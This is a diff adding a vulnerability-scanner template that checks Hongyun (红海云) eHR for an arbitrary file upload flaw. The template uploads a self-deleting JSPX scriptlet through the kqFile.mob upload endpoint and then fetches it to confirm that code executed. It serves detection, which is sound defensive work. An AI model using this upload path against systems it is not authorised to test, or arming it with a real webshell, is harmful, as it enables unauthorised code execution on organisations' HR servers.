@@ -1,0 +1,50 @@
+id: hr-soft-ehr-file-upload
+info:
+  name: 红海云 eHR - 任意文件上传漏洞
+  author: Chaitin
+  severity: medium
+  metadata:
+    verified: true
+    max-request: 2
+    vuln-id: CT-1382961
+    vendor: hr_soft
+    product: ehr
+  tags: file-upload,vuln,ehr
+variables:
+  s1: '{{rand_int(1000000, 2000000)}}'
+  s2: '{{rand_int(1000000, 2000000)}}'
+  rBoundary: '{{to_lower(rand_text_alpha(8))}}'
+flow: http(1) && http(2)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/RedseaPlatform/kqFile.mob?method=uploadFile&fileName=123.jspx'
+    redirects: false
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rBoundary}}
+    body: |
+      ------WebKitFormBoundary{{rBoundary}}
+      Content-Disposition: form-data; name="fj_file"; filename="test.jpg"
+
+      <jsp:root version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page"><jsp:directive.page contentType="text/html"/><jsp:directive.page pageEncoding="UTF-8"/><jsp:scriptlet><![CDATA[out.print({{s1}}+{{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();]]></jsp:scriptlet></jsp:root>
+      ------WebKitFormBoundary{{rBoundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+        internal: true
+    extractors:
+      - type: regex
+        name: uploadfilename
+        part: body
+        group: 1
+        regex:
+          - '(/.+?jspx)'
+        internal: true
+  - method: GET
+    path:
+      - '{{BaseURL}}/uploadfile/{{uploadfilename}}'
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && contains(body, to_string(s1 + s2))'
